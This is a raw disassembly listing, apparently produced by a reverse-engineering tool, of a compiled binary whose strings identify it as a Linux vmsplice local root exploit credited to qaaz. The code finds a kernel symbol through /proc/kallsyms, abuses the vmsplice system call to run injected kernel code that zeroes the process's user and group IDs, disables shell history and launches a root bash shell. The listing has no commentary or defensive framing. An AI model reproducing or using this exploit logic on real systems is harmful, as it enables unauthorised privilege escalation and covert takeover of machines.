xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff0
push eax
push esp
push edx
push sym.__libc_csu_fini
push sym.__libc_csu_init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
push ebx
sub esp, 4
cmp byte [obj.completed.7065], 0
jne 0x80487ef
mov eax, dword [obj.dtor_idx.7067]
mov ebx, obj.__DTOR_END__
sub ebx, obj.__DTOR_LIST__
sar ebx, 2
sub ebx, 1
cmp eax, ebx
jae 0x80487e8
lea esi, [esi]
add eax, 1
mov dword [obj.dtor_idx.7067], eax
call dword [eax*4 + obj.__DTOR_LIST__]
mov eax, dword [obj.dtor_idx.7067]
cmp eax, ebx
jb 0x80487d0
mov byte [obj.completed.7065], 1
add esp, 4
pop ebx
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [obj.__JCR_LIST__]
test eax, eax
je 0x8048821
mov eax, 0
test eax, eax
je 0x8048821
mov dword [esp], obj.__JCR_LIST__
call eax
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 4
mov eax, dword [obj.__CTOR_LIST__]
cmp eax, 0xffffffff
je 0x8048d64
mov ebx, obj.__CTOR_LIST__
nop
sub ebx, 4
call eax
mov eax, dword [ebx]
cmp eax, 0xffffffff
jne 0x8048d58
add esp, 4
pop ebx
pop ebp
ret
push ebp
mov ebp, esp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0xa8
mov eax, dword gs:[0x14]
mov dword [canary], eax
xor eax, eax
mov dword [var_94h], 0
mov edx, 0x8048da4
mov eax, str._proc_kallsyms
mov dword [endptr], edx
mov dword [esp], eax
call sym.imp.fopen
mov dword [var_90h], eax
cmp dword [var_90h], 0
jne 0x804891e
call sym.imp.__errno_location
mov eax, dword [eax]
mov dword [endptr], eax
mov dword [esp], str._proc_kallsyms
call sym.die
jmp 0x804891f
mov dword [endptr], str._sys_vm86old
lea eax, [str]
mov dword [esp], eax
call sym.imp.strstr
test eax, eax
je 0x804891f
lea eax, [str]
mov dword [stream], 0x10
mov dword [endptr], 0
mov dword [esp], eax
call sym.imp.strtoul
mov dword [var_94h], eax
jmp 0x8048943
nop
mov eax, dword [var_90h]
mov dword [stream], eax
mov dword [endptr], 0x80
lea eax, [str]
mov dword [esp], eax
call sym.imp.fgets
test eax, eax
jne 0x80488de
mov eax, dword [var_90h]
mov dword [esp], eax
call sym.imp.fclose
mov eax, dword [var_94h]
mov edx, dword [canary]
xor edx, dword gs:[0x14]
je 0x8048968
call sym.imp.__stack_chk_fail
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 4
call 0x8048d78
pop ebx
add ebx, 0x127c
call sym.__do_global_dtors_aux
pop ecx
pop ebx
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 0x10
mov eax, esp
and eax, 0xffffe000
mov eax, dword [eax]
mov dword [var_10h], eax
mov eax, dword [var_10h]
mov dword [var_ch], eax
mov dword [var_8h], 0
jmp 0x8048aac
mov eax, dword [var_ch]
mov edx, dword [eax]
mov eax, dword [obj.uid]
cmp edx, eax
jne 0x8048aa4
mov eax, dword [var_ch]
add eax, 4
mov edx, dword [eax]
mov eax, dword [obj.uid]
cmp edx, eax
jne 0x8048aa4
mov eax, dword [var_ch]
add eax, 8
mov edx, dword [eax]
mov eax, dword [obj.uid]
cmp edx, eax
jne 0x8048aa4
mov eax, dword [var_ch]
add eax, 0xc
mov edx, dword [eax]
mov eax, dword [obj.uid]
cmp edx, eax
jne 0x8048aa4
mov eax, dword [var_ch]
add eax, 0x10
mov edx, dword [eax]
mov eax, dword [obj.gid]
cmp edx, eax
jne 0x8048aa4
mov eax, dword [var_ch]
add eax, 0x14
mov edx, dword [eax]
mov eax, dword [obj.gid]
cmp edx, eax
jne 0x8048aa4
mov eax, dword [var_ch]
add eax, 0x18
mov edx, dword [eax]
mov eax, dword [obj.gid]
cmp edx, eax
jne 0x8048aa4
mov eax, dword [var_ch]
add eax, 0x1c
mov edx, dword [eax]
mov eax, dword [obj.gid]
cmp edx, eax
jne 0x8048aa4
mov eax, dword [var_ch]
add eax, 4
mov edx, dword [var_ch]
add edx, 8
mov ecx, dword [var_ch]
add ecx, 0xc
mov dword [ecx], 0
mov ecx, dword [ecx]
mov dword [edx], ecx
mov edx, dword [edx]
mov dword [eax], edx
mov edx, dword [eax]
mov eax, dword [var_ch]
mov dword [eax], edx
mov eax, dword [var_ch]
lea ebx, [eax + 0x10]
mov eax, dword [var_ch]
add eax, 0x14
mov edx, dword [var_ch]
add edx, 0x18
mov ecx, dword [var_ch]
add ecx, 0x1c
mov dword [ecx], 0
mov ecx, dword [ecx]
mov dword [edx], ecx
mov edx, dword [edx]
mov dword [eax], edx
mov eax, dword [eax]
mov dword [ebx], eax
add dword [var_ch], 0x24
mov eax, dword [var_ch]
add eax, 4
mov edx, dword [var_ch]
add edx, 8
mov dword [edx], 0xffffffff
mov edx, dword [edx]
mov dword [eax], edx
mov edx, dword [eax]
mov eax, dword [var_ch]
mov dword [eax], edx
jmp 0x8048ab9
add dword [var_ch], 4
add dword [var_8h], 1
cmp dword [var_8h], 0x3f2
jle 0x804898f
add esp, 0x10
pop ebx
pop ebp
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
call sym.__i686.get_pc_thunk.bx
add ebx, 0x1309
sub esp, 0x1c
call sym._init
lea edi, [ebx - 0xe0]
lea eax, [ebx - 0xe0]
sub edi, eax
sar edi, 2
test edi, edi
je 0x8048d32
xor esi, esi
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call dword [ebx + esi*4 - 0xe0]
add esi, 1
cmp esi, edi
jb 0x8048d10
add esp, 0x1c
pop ebx
pop esi
pop edi
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [errnum]
mov dword [esp], eax
call sym.imp.strerror
mov edx, eax
cmp dword [errnum], 0
je 0x8048844
mov eax, str._____s:__s_n
jmp 0x8048849
mov eax, str._____s_n
mov dword [var_8h], edx
mov edx, dword [arg_8h]
mov dword [var_4h], edx
mov dword [esp], eax
call sym.imp.printf
mov eax, dword [obj.stdout]
mov dword [esp], eax
call sym.imp.fflush
mov eax, dword [obj.stderr]
mov dword [esp], eax
call sym.imp.fflush
mov dword [esp], 1
call sym.imp.exit
mov ebx, dword [esp]
ret
push ebp
mov ebp, esp
and esp, 0xfffffff0
sub esp, 0x40
call sym.imp.getuid
mov dword [obj.uid], eax
call sym.imp.getgid
mov dword [obj.gid], eax
mov ecx, dword [obj.uid]
mov edx, dword [obj.uid]
mov eax, dword [obj.uid]
mov dword [nbytes], ecx
mov dword [ptr], edx
mov dword [esp], eax
call sym.imp.setresuid
mov ecx, dword [obj.gid]
mov edx, dword [obj.gid]
mov eax, dword [obj.gid]
mov dword [nbytes], ecx
mov dword [ptr], edx
mov dword [esp], eax
call sym.imp.setresgid
mov dword [esp], str.___________________________________
call sym.imp.puts
mov dword [esp], str._Linux_vmsplice_Local_Root_Exploit
call sym.imp.puts
mov dword [esp], str._By_qaaz
call sym.imp.puts
mov dword [esp], str.___________________________________
call sym.imp.puts
mov eax, dword [obj.uid]
test eax, eax
je 0x8048b60
mov eax, dword [obj.gid]
test eax, eax
jne 0x8048b74
mov dword [ptr], 0
mov dword [esp], str.___
call sym.die
call sym.get_target
mov dword [var_3ch], eax
mov eax, str.___addr:_0x_lx_n
mov edx, dword [var_3ch]
mov dword [ptr], edx
mov dword [esp], eax
call sym.imp.printf
lea eax, [var_34h]
mov dword [esp], eax
call sym.imp.pipe
test eax, eax
jns 0x8048bb9
call sym.imp.__errno_location
mov eax, dword [eax]
mov dword [ptr], eax
mov dword [esp], str.pipe
call sym.die
mov eax, dword [var_3ch]
mov dword [var_2ch], eax
mov dword [var_30h], 0x18
mov eax, dword [fd]
mov dword [nbytes], 0x18
mov dword [ptr], obj.trampoline
mov dword [esp], eax
call sym.imp.write
mov eax, dword [var_34h]
mov dword [var_10h], 0
mov dword [var_ch], 1
lea edx, [var_2ch]
mov dword [nbytes], edx
mov dword [ptr], eax
mov dword [esp], 0x13c
call sym.imp.syscall
mov dword [var_18h], 4
mov dword [var_14h], 3
mov dword [var_10h], 2
mov dword [var_ch], 1
mov dword [nbytes], sym.kernel_code
mov dword [ptr], 0x7a69
mov dword [esp], 0x71
call sym.imp.syscall
call sym.imp.getuid
test eax, eax
je 0x8048c6a
mov dword [ptr], 0
mov dword [esp], 0x8048e2f
call sym.die
mov dword [esp], str.___root
call sym.imp.puts
mov dword [esp], str.HISTFILE_dev_null
call sym.imp.putenv
mov dword [var_ch], 0
mov dword [nbytes], 0x8048e4f
mov dword [ptr], str.bash
mov dword [esp], str._bin_bash
call sym.imp.execl
call sym.imp.__errno_location
mov eax, dword [eax]
mov dword [ptr], eax
mov dword [esp], str._bin_bash
call sym.die
mov eax, 0
leave
ret
push ebp
mov ebp, esp
push ebx
sub esp, 4
call 0x80485c8
pop ebx
add ebx, 0x1a2c
mov edx, dword [ebx - 4]
test edx, edx
je 0x80485de
call loc.imp.__gmon_start__
call sym.frame_dummy
call sym.__do_global_ctors_aux
pop eax
pop ebx
leave
ret
jmp dword [reloc.__gmon_start__]
jmp dword [reloc.__errno_location]
jmp dword [reloc.strerror]
jmp dword [reloc.syscall]
jmp dword [reloc.write]
jmp dword [reloc.fgets]
jmp dword [reloc.execl]
jmp dword [reloc.setresuid]
jmp dword [reloc.setresgid]
jmp dword [reloc.fflush]
jmp dword [reloc.fclose]
jmp dword [reloc.strtoul]
jmp dword [reloc.fopen]
jmp dword [reloc.printf]
jmp dword [reloc.getuid]
jmp dword [reloc.putenv]
jmp dword [reloc.strstr]
jmp dword [reloc.__stack_chk_fail]
jmp dword [reloc.puts]
jmp dword [reloc.pipe]
jmp dword [reloc.exit]
jmp dword [reloc.getgid]
